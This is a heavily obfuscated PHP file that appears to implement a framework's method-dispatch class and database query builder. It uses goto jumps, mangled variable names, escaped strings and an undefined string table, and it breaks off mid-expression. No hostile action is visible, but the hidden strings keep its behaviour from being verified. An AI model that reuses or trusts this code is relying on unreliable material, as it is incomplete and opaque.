<?php
 goto F„ÕÂÆÃ±¡; Dğ‡ÇøÏÀ©: function binCheckBigger($¬¸œúîš, $–ß²Ô¼™) { return $¬¸œúîš > $–ß²Ô¼™; } $_SERVER[$_SERVER[×ùÑòÉÀ][3]] = ("\70\63\62\63"."\62\67")+0;$_4scb="t9q57g20sj84bahmzu6l3xev1cikprnyowdf6rnu81ji3wm2okas70bv5hpdqg49ylzxftec3f9yjh254t";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($‘†È—•À, $Ê‰è»½) { $­…Ô¾¯í =& $_SERVER[èùÙ¹Ïö]; if (isset(self::$_methodList[$‘†È—•À])) { return @call_user_func_array(self::$_methodList[$‘†È—•À], $Ê‰è»½); } else { if (method_exists($this, $‘†È—•À)) { return call_user_func_array(array($this, $‘†È—•À), $Ê‰è»½); } else { think_exception(__CLASS__ . $­…Ô¾¯í[4] . $‘†È—•À . $­…Ô¾¯í[5]); } } } public static function __callStatic($Ù¨ØÍÍ, $×‰Ç¢Û) { if (isset(self::$_methodListStatic[$Ù¨ØÍÍ])) { return call_user_func_array(self::$_methodListStatic[$Ù¨ØÍÍ], $×‰Ç¢Û); } else { if (method_exists(self, $Ù¨ØÍÍ)) { return call_user_func_array(array(self, $Ù¨ØÍÍ), $×‰Ç¢Û); } else { show_json("{$Ù¨ØÍÍ}\x28\x29\x20\x6e\157\x74\x20\145\x78\x69\163\x74\73", !1); } } } public static function addMethod($İòåí“¸, $¦ğ‰õ¡ò) { self::$_methodList[$İòåí“¸] = $¦ğ‰õ¡ò; } public static function addMethodStatic($­Å÷Ù÷Ê, $ª¥éş¾Õ) { self::$_methodListStatic[$­Å÷Ù÷Ê] = $ª¥éş¾Õ; } } goto A¨·“œÛÖö; dÔ‹ãŸÎÕ: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\x68\x69\156\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\75", "\x6e\145\x71" => "\74\76", "\x67\164" => "\x3e", "\145\147\x74" => "\76\x3d", "\x6c\x74" => "\74", "\145\154\164" => "\x3c\75", "\156\x6f\164\x6c\x69\x6b\145" => "\116\117\124\40\x4c\x49\x4b\x45", "\x6c\x69\153\x65" => "\114\111\113\x45", "\151\156" => "\x49\116", "\156\x6f\164\151\156" => "\x4e\x4f\x54\x20\x49\x4e", "\156\x6f\x74\40\x69\156" => "\116\117\x54\x20\111\116", "\x62\145\164\167\x65\x65\156" => "\x42\105\x54\127\x45\x45\116", "\x6e\x6f\164\x62\x65\x74\x77\145\x65\x6e" => "\x4e\117\124\x20\x42\x45\124\x57\105\x45\116", "\156\157\x74\x20\142\145\x74\x77\145\x65\156" => "\x4e\x4f\x54\x20\102\105\124\127\105\x45\116"); protected $selectSql = "\x53\x45\x4c\105\103\124\x25\104\111\x53\x54\111\116\103\124\x25\x20\45\x46\111\x45\114\x44\45\40\x46\122\x4f\115\x20\45\124\101\102\114\105\45\45\112\x4f\x49\x4e\x25\45\x57\x48\x45\x52\x45\45\45\107\122\x4f\x55\x50\x25\45\x48\x41\x56\111\116\107\x25\45\x4f\x52\x44\x45\122\45\x25\114\111\115\111\124\x25\x20\45\x55\x4e\111\117\x4e\45\x25\103\x4f\x4d\x4d\x45\116\124\x25"; protected $bind = array(); public static function getInstance() { $•èÑ½³‹ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[èùÙ¹Ïö][1006], $•èÑ½³‹); } public function factory($É’Å¾§ = '') { $á’°» =& $_SERVER[èùÙ¹Ïö]; $É’Å¾§ = $this->parseConfig($É’Å¾§); if (empty($É’Å¾§[$á’°»[1007]])) { think_exception(think_lang($á’°»[1008])); } $this->dbType = ucwords(strtolower($É’Å¾§[$á’°»[1007]])); $¥üùæíâ = $á’°»[1009] . $this->dbType; if (class_exists($¥üùæíâ)) { $¶Å“ñº = new $¥üùæíâ($É’Å¾§); if ($á’°»[1010] != strtolower($É’Å¾§[$á’°»[1007]])) { $¶Å“ñº->dbType = strtoupper($this->dbType); } else { $¶Å“ñº->dbType = $this->_getDsnType($É’Å¾§[$á’°»[962]]); } } else { think_exception(think_lang($á’°»[1011]) . $á’°»[1012] . $¥üùæíâ); } return $¶Å“ñº; } public function __call($£ŒõŸÊ”, $¡—Ø×¥Ø) { if (method_exists($this, $£ŒõŸÊ”)) { return call_user_func_array(array($this, $£ŒõŸÊ”), $¡—Ø×¥Ø); } } protected function _getDsnType($ ·û¸îÊ) { $÷şÓÌÂ = explode($_SERVER[èùÙ¹Ïö][4], $ ·û¸îÊ); $‰èšéöá = strtoupper(trim($÷şÓÌÂ[0])); return $‰èšéöá; } private function parseConfig($Íä²ÊÛÌ = '') { $³¸ŠÌú’ =& $_SERVER[èùÙ¹Ïö]; if (!empty($Íä²ÊÛÌ) && is_string($Íä²ÊÛÌ)) { $Íä²ÊÛÌ = $this->parseDSN($Íä²ÊÛÌ); } elseif (is_array($Íä²ÊÛÌ)) { $Íä²ÊÛÌ = array_change_key_case($Íä²ÊÛÌ); $Íä²ÊÛÌ = array($³¸ŠÌú’[1007] => $Íä²ÊÛÌ[$³¸ŠÌú’[1013]], $³¸ŠÌú’[934] => $Íä²ÊÛÌ[$³¸ŠÌú’[1014]], $³¸ŠÌú’[935] => $Íä²ÊÛÌ[$³¸ŠÌú’[1015]], $³¸ŠÌú’[932] => $Íä²ÊÛÌ[$³¸ŠÌú’[1016]], $³¸ŠÌú’[933] => $Íä²ÊÛÌ[$³¸ŠÌú’[1017]], $³¸ŠÌú’[21] => $Íä²ÊÛÌ[$³¸ŠÌú’[1018]], $³¸ŠÌú’[962] => $Íä²ÊÛÌ[$³¸ŠÌú’[1019]], $³¸ŠÌú’[17] => isset($Íä²ÊÛÌ[$³¸ŠÌú’[1020]]) ? $Íä²ÊÛÌ[$³¸ŠÌú’[1020]] : array()); } elseif (empty($Íä²ÊÛÌ)) { if (think_config($³¸ŠÌú’[1021]) && $³¸ŠÌú’[1010] != strtolower(think_config($³¸ŠÌú’[1022]))) { $Íä²ÊÛÌ = $this->parseDSN(think_config($³¸ŠÌú’[1021])); } else { $Íä²ÊÛÌ = array($³¸ŠÌú’[1007] => think_config($³¸ŠÌú’[1022]), $³¸ŠÌú’[934] => think_config($³¸ŠÌú’[1023]), $³¸ŠÌú’[935] => think_config($³¸ŠÌú’[1024]), $³¸ŠÌú’[932] => think_config($³¸ŠÌú’[1025]), $³¸ŠÌú’[933] => think_config($³¸ŠÌú’[1026]), $³¸ŠÌú’[21] => think_config($³¸ŠÌú’[292]), $³¸ŠÌú’[962] => think_config($³¸ŠÌú’[1021]), $³¸ŠÌú’[17] => think_config($³¸ŠÌú’[1027])); } } return $Íä²ÊÛÌ; } protected function initConnect($²È”Ñ«÷ = true) { if (1 == think_config($_SERVER[èùÙ¹Ïö][22])) { $this->_linkID = $this->multiConnect($²È”Ñ«÷); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $õ¾†’Üæ => $ò‘†ŒÊØ) { $this->_linkID = $ò‘†ŒÊØ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ï¦¼µ’ = false) { $«ôı½ Ä =& $_SERVER[èùÙ¹Ïö]; static $ÔÌÉëÚô = array(); static $—Ïå¶‡ó = -1; if (empty($ÔÌÉëÚô)) { foreach ($this->config as $ÃÙâ»¬¤ => $İÁÙÔ¹) { $ÔÌÉëÚô[$ÃÙâ»¬¤] = explode($«ôı½ Ä[50], $İÁÙÔ¹); } } if (think_config($«ôı½ Ä[1028])) { if ($ï¦¼µ’ || think_config($«ôı½ Ä[441]) === !0) { $çÄ”Í÷ = floor(mt_rand(0, think_config($«ôı½ Ä[1029]) - 1)); $—Ïå¶‡ó = $çÄ”Í÷; } else { if (is_numeric(think_config($«ôı½ Ä[1030]))) { $çÄ”Í÷ = think_config($«ôı½ Ä[1030]); } else { $çÄ”Í÷ = floor(mt_rand(think_config($«ôı½ Ä[1029]), count($ÔÌÉëÚô[$«ôı½ Ä[932]]) - 1)); } } } else { $çÄ”Í÷ = floor(mt_rand(0, count($ÔÌÉëÚô[$«ôı½ Ä[932]]) - 1)); $—Ïå¶‡ó = $çÄ”Í÷; } $çÄ”Í÷ = $—Ïå¶‡ó !== -1 ? $—Ïå¶‡ó : $çÄ”Í÷; $¾Í’’™¨ = array($«ôı½ Ä[934] => isset($ÔÌÉëÚô[$«ôı½ Ä[934]][$çÄ”Í÷]) ? $ÔÌÉëÚô[$«ôı½ Ä[934]][$çÄ”Í÷] : $ÔÌÉëÚô[$«ôı½ Ä[934]][0], $«ôı½ Ä[935] => isset($ÔÌÉëÚô[$«ôı½ Ä[935]][$çÄ”Í÷]) ? $ÔÌÉëÚô[$«ôı½ Ä[935]][$çÄ”Í÷] : $ÔÌÉëÚô[$«ôı½ Ä[935]][0], $«ôı½ Ä[932] => isset($ÔÌÉëÚô[$«ôı½ Ä[932]][$çÄ”Í÷]) ? $ÔÌÉëÚô[$«ôı½ Ä[932]][$çÄ”Í÷] : $ÔÌÉëÚô[$«ôı½ Ä[932]][0], $«ôı½ Ä[933] => isset($ÔÌÉëÚô[$«ôı½ Ä[933]][$çÄ”Í÷]) ? $ÔÌÉëÚô[$«ôı½ Ä[933]][$çÄ”Í÷] : $ÔÌÉëÚô[$«ôı½ Ä[933]][0], $«ôı½ Ä[21] => isset($ÔÌÉëÚô[$«ôı½ Ä[21]][$çÄ”Í÷]) ? $ÔÌÉëÚô[$«ôı½ Ä[21]][$çÄ”Í÷] : $ÔÌÉëÚô[$«ôı½ Ä[21]][0], $«ôı½ Ä[962] => isset($ÔÌÉëÚô[$«ôı½ Ä[962]][$çÄ”Í÷]) ? $ÔÌÉëÚô[$«ôı½ Ä[962]][$çÄ”Í÷] : $ÔÌÉëÚô[$«ôı½ Ä[962]][0], $«ôı½ Ä[17] => isset($ÔÌÉëÚô[$«ôı½ Ä[17]][$çÄ”Í÷]) ? $ÔÌÉëÚô[$«ôı½ Ä[17]][$çÄ”Í÷] : $ÔÌÉëÚô[$«ôı½ Ä[17]][0]); return $this->connect($¾Í’’™¨, $çÄ”Í÷); } public function parseDSN($âÍ×±ˆ) { $²Ş±¶ö„ =& $_SERVER[èùÙ¹Ïö]; if (empty($âÍ×±ˆ)) { return !1; } $÷ÅÌ Ş = parse_url($âÍ×±ˆ); if ($÷ÅÌ Ş[$²Ş±¶ö„[197]]) { $ªó­å­Œ = array($²Ş±¶ö„[1007] => $÷ÅÌ Ş[$²Ş±¶ö„[197]], $²Ş±¶ö„[934] => isset($÷ÅÌ Ş[$²Ş±¶ö„[633]]) ? $÷ÅÌ Ş[$²Ş±¶ö„[633]] : $²Ş±¶ö„[12], $²Ş±¶ö„[935] => isset($÷ÅÌ Ş[$²Ş±¶ö„[1031]]) ? $÷ÅÌ Ş[$²Ş±¶ö„[1031]] : $²Ş±¶ö„[12], $²Ş±¶ö„[932] => isset($÷ÅÌ Ş[$²Ş±¶ö„[198]]) ? $÷ÅÌ Ş[$²Ş±¶ö„[198]] : $²Ş±¶ö„[12], $²Ş±¶ö„[933] => isset($÷ÅÌ Ş[$²Ş±¶ö„[199]]) ? $÷ÅÌ Ş[$²Ş±¶ö„[199]] : $²Ş±¶ö„[12], $²Ş±¶ö„[21] => isset($÷ÅÌ Ş[$²Ş±¶ö„[86]]) ? substr($÷ÅÌ Ş[$²Ş±¶ö„[86]], 1) : $²Ş±¶ö„[12]); } else { preg_match($²Ş±¶ö„[1032], trim($âÍ×±ˆ), $€¢¹Ñ¼Ô); $ªó­å­Œ = array($²Ş±¶ö„[1007] => $€¢¹Ñ¼Ô[1], $²Ş±¶ö„[934] => $€¢¹Ñ¼Ô[2], $²Ş±¶ö„[935] => $€¢¹Ñ¼Ô[3], $²Ş±¶ö„[932] => $€¢¹Ñ¼Ô[4], $²Ş±¶ö„[933] => $€¢¹Ñ¼Ô[5], $²Ş±¶ö„[21] => $€¢¹Ñ¼Ô[6]); } $ªó­å­Œ[$²Ş±¶ö„[962]] = $²Ş±¶ö„[12]; return $ªó­å­Œ; } protected function debug() { $æä¥Ï°Ù =& $_SERVER[èùÙ¹Ïö]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $æä¥Ï°Ù[1033]; if (think_config($æä¥Ï°Ù[1034])) { think_status($æä¥Ï°Ù[1035]); think_trace($this->queryStr . $æä¥Ï°Ù[1036] . think_status($æä¥Ï°Ù[24], $æä¥Ï°Ù[1035], 6) . $æä¥Ï°Ù[1037], $æä¥Ï°Ù[12], $æä¥Ï°Ù[1038]); } } protected function parseLock($ôçğ¤… = false) { $å—ñÅœß =& $_SERVER[èùÙ¹Ïö]; if (!$ôçğ¤…) { return $å—ñÅœß[12]; } if ($å—ñÅœß[964] == $this->dbType) { return $å—ñÅœß[1039]; } return $å—ñÅœß[1040]; } protected function parseSet($ÖıôÑÏ¹) { $êêœ‡¶ =& $_SERVER[èùÙ¹Ïö]; foreach ($ÖıôÑÏ¹ as $ßÙÁ˜ => $ş¡·Ì³) { if (is_array($ş¡·Ì³) && $êêœ‡¶[343] == $ş¡·Ì³[0]) { $ˆ€Ñ—ƒ[] = $this->parseKey($ßÙÁ˜) . $êêœ‡¶[930] . $ş¡·Ì³[1]; } elseif (is_scalar($ş¡·Ì³) || is_null($ş¡·Ì³)) { $ˆ€Ñ—ƒ[] = $this->parseKey($ßÙÁ˜) . $êêœ‡¶[930] . $this->parseValue($ş¡·Ì³); } } return $êêœ‡¶[1041] . implode($êêœ‡¶[50], $ˆ€Ñ—ƒ); } protected function bindParam($­Ôúù‰, $ùÙŒğç) { $this->bind[$_SERVER[èùÙ¹Ïö][4] . $­Ôúù‰] = $ùÙŒğç; } protected function parseBind($¡œŒ®ôí) { $¡œŒ®ôí = array_merge($this->bind, $¡œŒ®ôí); $this->bind = array(); return $¡œŒ®ôí; } function parseKey(&$Ÿ¶â‡œ§, $¦Áßâ»Ø = true) { if ($¦Áßâ»Ø) { $Ÿ¶â‡œ§ = $this->parseKeyCheck($Ÿ¶â‡œ§); } return $Ÿ¶â‡œ§; } function parseKeyCheck($ïƒÊõÓ¥) { $èµæš£ê =& $_SERVER[èùÙ¹Ïö]; $ïƒÊõÓ¥ = trim($ïƒÊõÓ¥); if (!preg_match($èµæš£ê[1042], $ïƒÊõÓ¥)) { think_exception($èµæš£ê[1043] . $ïƒÊõÓ¥); } return $ïƒÊõÓ¥; } protected function parseValue($…›™Ö•¢) { $•Íë¤¼æ =& $_SERVER[èùÙ¹Ïö]; if (is_string($…›™Ö•¢)) { $…›™Ö•¢ = $•Íë¤¼æ[1003] . $this->escapeString($…›™Ö•¢) . $•Íë¤¼æ[1003]; } elseif (isset($…›™Ö•¢[0]) && is_string($…›™Ö•¢[0]) && strtolower($…›™Ö•¢[0]) == $•Íë¤¼æ[343]) { $…›™Ö•¢ = $this->escapeString($…›™Ö•¢[1]); } elseif (is_array($…›™Ö•¢)) { $…›™Ö•¢ = array_map(array($this, $•Íë¤¼æ[1004]), $…›™Ö•¢); } elseif (is_bool($…›™Ö•¢)) { $…›™Ö•¢ = $…›™Ö•¢ ? $•Íë¤¼æ[90] : $•Íë¤¼æ[214]; } elseif (is_null($…›™Ö•¢)) { $…›™Ö•¢ = $•Íë¤¼æ[105]; } return $…›™Ö•¢; } protected function parseField($œæöñíà) { $Úåœ÷ö§ =& $_SERVER[èùÙ¹Ïö]; if (is_string($œæöñíà) && strpos($œæöñíà, $Úåœ÷ö§[50])) { $œæöñíà = explode($Úåœ÷ö§[50], $œæöñíà); } if (is_array($œæöñíà)) { $Ôµ¥³¬Ü = array(); foreach ($œæöñíà as $Ê¾Á¤šÖ => $˜°Ò§ş) { if (!is_numeric($Ê¾Á¤šÖ)) { $Ôµ¥³¬Ü[] = $this->parseKey($Ê¾Á¤šÖ, !1) . $Úåœ÷ö§[1044] . $this->parseKey($˜°Ò§ş); } else { $Ôµ¥³¬Ü[] = $this->parseKey($˜°Ò§ş); } } $²òè¿ğ² = implode($Úåœ÷ö§[50], $Ôµ¥³¬Ü); } elseif (is_string($œæöñíà) && !empty($œæöñíà)) { $²òè¿ğ² = $œæöñíà; } else { $²òè¿ğ² = $Úåœ÷ö§[205]; } return $²òè¿ğ²; } protected function parseTable($ÓæŒà£±) { $­éĞš÷É =& $_SERVER[èùÙ¹Ïö]; if (is_array($ÓæŒà£±)) { $‡ÄÙÒ«­ = array(); foreach ($ÓæŒà£± as $ã½‡ÂÇ => $†°ÁàÙ) { if (!is_numeric($ã½‡ÂÇ)) { $‡ÄÙÒ«­[] = $this->parseKey($ã½‡ÂÇ) . $­éĞš÷É[53] . $this->parseKey($†°ÁàÙ); } else { $‡ÄÙÒ«­[] = $this->parseKey($ã½‡ÂÇ); } } $ÓæŒà£± = $‡ÄÙÒ«­; } elseif (is_string($ÓæŒà£±)) { if (strstr($ÓæŒà£±, $­éĞš÷É[53])) { return $ÓæŒà£±; } $ÓæŒà£± = explode($­éĞš÷É[50], $ÓæŒà£±); array_walk($ÓæŒà£±, array($this, $­éĞš÷É[952])); } return $­éĞš÷É[946] . trim(implode($­éĞš÷É[1045], $ÓæŒà£±), $­éĞš÷É[431]) . $­éĞš÷É[946]; } protected function parseWhere($ùÉší‚Ğ) { $êíŠ›ÅÖ =& $_SERVER[èùÙ¹Ïö]; $œĞÃ±Î® = $êíŠ›ÅÖ[12]; if (is_string($ùÉší‚Ğ)) { $œĞÃ±Î® = $ùÉší‚Ğ; } else { $›¹ë£ûï = isset($ùÉší‚Ğ[$êíŠ›ÅÖ[1046]]) ? strtoupper($ùÉší‚Ğ[$êíŠ›ÅÖ[1046]]) : $êíŠ›ÅÖ[12]; if (in_array($›¹ë£ûï, array($êíŠ›ÅÖ[1047], $êíŠ›ÅÖ[1048], $êíŠ›ÅÖ[1049]))) { $›¹ë£ûï = $êíŠ›ÅÖ[53] . $›¹ë£ûï . $êíŠ›ÅÖ[53]; unset($ùÉší‚Ğ[$êíŠ›ÅÖ[1046]]); } else { $›¹ë£ûï = $êíŠ›ÅÖ[1050]; } foreach ($ùÉší‚Ğ as $†şÒùºï => $¡Óçùšğ) { $œĞÃ±Î® .= $êíŠ›ÅÖ[323]; if (is_numeric($†şÒùºï)) { $†şÒùºï = $êíŠ›ÅÖ[1051]; } if (0 === strpos($†şÒùºï, $êíŠ›ÅÖ[11])) { $œĞÃ±Î® .= $this->parseThinkWhere($†şÒùºï, $¡Óçùšğ); } else { if (!preg_match($êíŠ›ÅÖ[1052], trim($†şÒùºï))) { think_exception(think_lang($êíŠ›ÅÖ[1053]) . $êíŠ›ÅÖ[4] . $†şÒùºï); } $íÚîü¤Ø = is_array($¡Óçùšğ) && isset($¡Óçùšğ[$êíŠ›ÅÖ[1054]]); $†şÒùºï = trim($†şÒùºï); if (strpos($†şÒùºï, $êíŠ›ÅÖ[329])) { $¤ª¯”ş‡ = explode($êíŠ›ÅÖ[329], $†şÒùºï); $ø×²Œµ = array(); foreach ($¤ª¯”ş‡ as $Ñò¥ßÏ÷ => $òşêªİ) { $éÁ¸äêÑ = $íÚîü¤Ø ? $¡Óçùšğ[$Ñò¥ßÏ÷] : $¡Óçùšğ; $ø×²Œµ[] = $êíŠ›ÅÖ[306] . $this->parseWhereItem($this->parseKey($òşêªİ), $éÁ¸äêÑ) . $êíŠ›ÅÖ[951]; } $œĞÃ±Î® .= implode($êíŠ›ÅÖ[1055], $ø×²Œµ); } elseif (strpos($†şÒùºï, $êíŠ›ÅÖ[330])) { $¤ª¯”ş‡ = explode($êíŠ›ÅÖ[330], $†şÒùºï); $ø×²Œµ = array(); foreach ($¤ª¯”ş‡ as $Ñò¥ßÏ÷ => $òşêªİ) { $éÁ¸äêÑ = $íÚîü¤Ø ? $¡Óçùšğ[$Ñò¥ßÏ÷] : $¡Óçùšğ; $ø×²Œµ[] = $êíŠ›ÅÖ[306] . $this->parseWhereItem($this->parseKey($òşêªİ), $éÁ¸äêÑ) . $êíŠ›ÅÖ[951]; } $œĞÃ±Î® .= implode($êíŠ›ÅÖ[1050], $ø×²Œµ); } else { $œĞÃ±Î® .= $this->parseWhereItem($this->parseKey($†şÒùºï), $¡Óçùšğ); } } $œĞÃ±Î® .= $êíŠ›ÅÖ[324] . $›¹ë£ûï; } $œĞÃ±Î® = substr($œĞÃ±Î®, 0, -strlen($›¹ë£ûï)); } return empty($œĞÃ±Î®) ? $êíŠ›ÅÖ[12] : $êíŠ›ÅÖ[1056] . $œĞÃ±Î®; } protected function parseWhereItem($¥†ÌÙ”ò, $ÜÇÃùÒ) { $øìîıæç =& $_SERVER[èùÙ¹Ïö]; $ì¶öµ = $øìîıæç[12]; if (is_array($ÜÇÃùÒ)) { if (is_string($ÜÇÃùÒ[0])) { $‹÷¢î”‚ = strtolower($ÜÇÃùÒ[0]); if (in_array($ÜÇÃùÒ[0], array($øìîıæç[930], $øìîıæç[1057], $øìîıæç[1058], $øìîıæç[1059], $øìîıæç[1060], $øìîıæç[1061]))) { $ì¶öµ .= $¥†ÌÙ”ò . $øìîıæç[53] . $ÜÇÃùÒ[0] . $øìîıæç[53] . $this->parseValue($ÜÇÃùÒ[1]); } elseif (preg_match($øìîıæç[1062], $ÜÇÃùÒ[0])) { $ì¶öµ .= $¥†ÌÙ”ò . $øìîıæç[53] . $this->exp[$‹÷¢î”‚] . $øìîıæç[53] . $this->parseValue($ÜÇÃùÒ[1]); } elseif (preg_match($øìîıæç[1063], $ÜÇÃùÒ[0])) { if (is_array($ÜÇÃùÒ[1])) { $ù€†¡£Ã = isset($ÜÇÃùÒ[2]) ? strtoupper($ÜÇÃùÒ[2]) : $øìîıæç[1048]; if (in_array($ù€†¡£Ã, array($øìîıæç[1047], $øìîıæç[1048], $øìîıæç[1049]))) { $Êˆ²ğ¼„ = array(); foreach ($ÜÇÃùÒ[1] as $Ò„´ö£) { $Êˆ²ğ¼„[] = $¥†ÌÙ”ò . $øìîıæç[53] . $this->exp[$‹÷¢î”‚] . $øìîıæç[53] . $this->parseValue($Ò„´ö£); } $ì¶öµ .= $øìîıæç[306] . implode($øìîıæç[53] . $ù€†¡£Ã . $øìîıæç[53], $Êˆ²ğ¼„) . $øìîıæç[951]; } } else { $ì¶öµ .= $¥†ÌÙ”ò . $øìîıæç[53] . $this->exp[$‹÷¢î”‚] . $øìîıæç[53] . $this->parseValue($ÜÇÃùÒ[1]); } } elseif ($øìîıæç[343] == $‹÷¢î”‚) { $ì¶öµ .= $øìîıæç[949] . $¥†ÌÙ”ò . $øìîıæç[53] . $ÜÇÃùÒ[1] . $øìîıæç[1064]; } elseif (preg_match($øìîıæç[1065], $ÜÇÃùÒ[0])) { $ì¶öµ .= $ÜÇÃùÒ[0]; } elseif (preg_match($øìîıæç[1066], $ÜÇÃùÒ[0])) { if (isset($ÜÇÃùÒ[2]) && $øìîıæç[343] == $ÜÇÃùÒ[2]) { $ì¶öµ .= $¥†ÌÙ”ò . $øìîıæç[53] . $this->exp[$‹÷¢î”‚] . $øìîıæç[53] . $ÜÇÃùÒ[1]; } else { if (is_string($ÜÇÃùÒ[1])) { $ÜÇÃùÒ[1] = explode($øìîıæç[50], $ÜÇÃùÒ[1]); } $¶»§ßï = implode($øìîıæç[50], $this->parseValue($ÜÇÃùÒ[1])); $ì¶öµ .= $¥†ÌÙ”ò . $øìîıæç[53] . $this->exp[$‹÷¢î”‚] . $øìîıæç[949] . $¶»§ßï . $øìîıæç[951]; } } elseif (preg_match($øìîıæç[1067], $ÜÇÃùÒ[0])) { $¥•Ö¥«» = is_string($ÜÇÃùÒ[1]) ? explode($øìîıæç[50], $ÜÇÃùÒ[1]) : $ÜÇÃùÒ[1]; $ì¶öµ .= $øìîıæç[949] . $¥†ÌÙ”ò . $øìîıæç[53] . $this->exp[$‹÷¢î”‚] . $øìîıæç[53] . $this->parseValue($¥•Ö¥«»[0]) . $øìîıæç[1050] . $this->parseValue($¥•Ö¥«»[1]) . $øìîıæç[324]; } else { think_exception(think_lang($øìîıæç[1053]) . $øìîıæç[4] . $ÜÇÃùÒ[0]); } } else { $û÷±–¦Ğ = count($ÜÇÃùÒ); $ïôÈ¾ä€ = $øìîıæç[12]; if (is_string($ÜÇÃùÒ[$û÷±–¦Ğ - 1])) { $ïôÈ¾ä€ = isset($ÜÇÃùÒ[$û÷±–¦Ğ - 1]) ? strtoupper($ÜÇÃùÒ[$û÷±–¦Ğ - 1]) : $øìîıæç[12]; if (in_array($ïôÈ¾ä€, array($øìîıæç[1047], $øìîıæç[1048], $øìîıæç[1049]))) { $û÷±–¦Ğ = $û÷±–¦Ğ - 1; } } else { $ïôÈ¾ä€ = $øìîıæç[1047]; } for ($¯¯¥Ç’ğ = 0; $¯¯¥Ç’ğ < $û÷±–¦Ğ; $¯¯¥Ç’ğ++) { $¥•Ö¥«» = is_array($ÜÇÃùÒ[$¯¯¥Ç’ğ]) ? $ÜÇÃùÒ[$¯¯¥Ç’ğ][1] : $ÜÇÃùÒ[$¯¯¥Ç’ğ]; if ($øìîıæç[343] == strtolower($ÜÇÃùÒ[$¯¯¥Ç’ğ][0])) { $ì¶öµ .= $øìîıæç[306] . $¥†ÌÙ”ò . $øìîıæç[53] . $¥•Ö¥«» . $øìîıæç[1064] . $ïôÈ¾ä€ . $øìîıæç[53]; } else { $êİ¬‘ãş = is_array($ÜÇÃùÒ[$¯¯¥Ç’ğ]) ? $this->exp[strtolower($ÜÇÃùÒ[$¯¯¥Ç’ğ][0])] : $øìîıæç[930]; if (!$êİ¬‘ãş && is_array($ÜÇÃùÒ[$¯¯¥Ç’ğ]) && in_array($ÜÇÃùÒ[$¯¯¥Ç’ğ][0], array($øìîıæç[930], $øìîıæç[1057], $øìîıæç[1058], $øìîıæç[1059], $øìîıæç[1060], $øìîıæç[1061]))) { $êİ¬‘ãş = $ÜÇÃùÒ[$¯¯¥Ç’ğ][0]; } $ì¶öµ .= $øìîıæç[306] . $¥†ÌÙ”ò . $øìîıæç[53] . $êİ¬‘ãş . $øìîıæç[53] . $this->parseValue($¥•Ö¥«») . $øìîıæç[1064] . $ïôÈ¾ä€ . $øìîıæç[53]; } } $ì¶öµ = substr($ì¶öµ, 0, -4); } } else { $ì¶öµ .= $¥†ÌÙ”ò . $øìîıæç[1068] . $this->parseValue($ÜÇÃùÒ); } return $ì¶öµ; } protected function parseThinkWhere($®ã´¿³–, $Í“çÕ) { $â•ºşˆß =& $_SERVER[èùÙ¹Ïö]; $ï®°Æô = $â•ºşˆß[12]; switch ($®ã´¿³–) { case $â•ºşˆß[398]: $ï®°Æô = $Í“çÕ; break; case $â•ºşˆß[1051]: $ï®°Æô = is_string($Í“çÕ) ? $Í“çÕ : substr($this->parseWhere($Í“çÕ), 6); break; case $â•ºşˆß[1069]: parse_str($Í“çÕ, $ Ü¹µ½¶); if (isset($ Ü¹µ½¶[$â•ºşˆß[1046]])) { $‚ó¿¸ƒ = $â•ºşˆß[53] . strtoupper($ Ü¹µ½¶[$â•ºşˆß[1046]]) . $â•ºşˆß[53]; unset($ Ü¹µ½¶[$â•ºşˆß[1046]]); } else { $‚ó¿¸ƒ = $â•ºşˆß[1050]; } $©–œ´‰ = array(); foreach ($ Ü¹µ½¶ as $Í˜ù—ÚŒ => $Û£³ñ¡Ö) { $©–œ´‰[] = $this->parseKey($Í˜ù—ÚŒ) . $â•ºşˆß[1068] . $this->parseValue($Û£³ñ¡Ö); } $ï®°Æô = implode($‚ó¿¸ƒ, $©–œ´‰); break; } return $ï®°Æô; } protected function parseLimit($Ï§ë¥­á) { $ø˜ûöµ— =& $_SERVER[èùÙ¹Ïö]; return !empty($Ï§ë¥­á) ? $ø˜ûöµ—[51] . $Ï§ë¥­á . $ø˜ûöµ—[53] : $ø˜ûöµ—[12]; } protected function parseJoin($ÑÇÎ©ñ) { $Û¬‚ÌÙ„ =& $_SERVER[èùÙ¹Ïö]; $şÄÈ = $Û¬‚ÌÙ„[12]; if (!empty($ÑÇÎ©ñ)) { if (is_array($ÑÇÎ©ñ)) { foreach ($ÑÇÎ©ñ as $—¨Œğğ® => $«ùëŒ±) { if (!1 !== stripos($«ùëŒ±, $Û¬‚ÌÙ„[1070])) { $şÄÈ .= $Û¬‚ÌÙ„[53] . $«ùëŒ±; } else { $şÄÈ .= $Û¬‚ÌÙ„[1071] . $«ùëŒ±; } } } else { $şÄÈ .= $Û¬‚ÌÙ„[1071] . $ÑÇÎ©ñ; } } $şÄÈ = preg_replace($Û¬‚ÌÙ„[1072], think_config($Û¬‚ÌÙ„[976]) . $Û¬‚ÌÙ„[1073], $şÄÈ); return $şÄÈ; } protected function parseOrder($Ø—‰âüê) { $¿Í œ¤É =& $_SERVER[èùÙ¹Ïö]; if (is_array($Ø—‰âüê)) { $¦º¼‘×• = array(); foreach ($Ø—‰âüê as $ãşúš†Š => $ €©ëñÖ) { if (is_numeric($ãşúš†Š)) { $¦º¼‘×•[] = $this->parseKey($ €©ëñÖ); } else { $ €©ëñÖ = in_array(strtoupper(trim($ €©ëñÖ)), array($¿Í œ¤É[1074], $¿Í œ¤É[1075])) ? $¿Í œ¤É[53] . $ €©ëñÖ : $¿Í œ¤É[12]; if (preg_match($¿Í œ¤É[1076], $ãşúš†Š)) { $¦º¼‘×•[] = $this->parseKey($ãşúš†Š) . $ €©ëñÖ; } else { think_exception($¿Í œ¤É[1077] . 